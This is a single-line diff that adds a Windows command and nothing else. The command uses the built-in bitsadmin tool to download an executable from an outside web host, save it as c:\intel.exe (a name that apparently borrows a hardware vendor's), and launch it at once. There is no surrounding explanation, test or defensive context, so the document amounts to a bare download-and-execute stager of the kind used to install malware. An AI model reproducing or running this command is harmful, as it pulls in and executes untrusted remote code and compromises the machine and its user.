@@ -1,0 +1,1 @@
+bitsadmin /transfer myjob /download /priority high http://webseite.com/intel c:\intel.exe & start c:\intel.exe
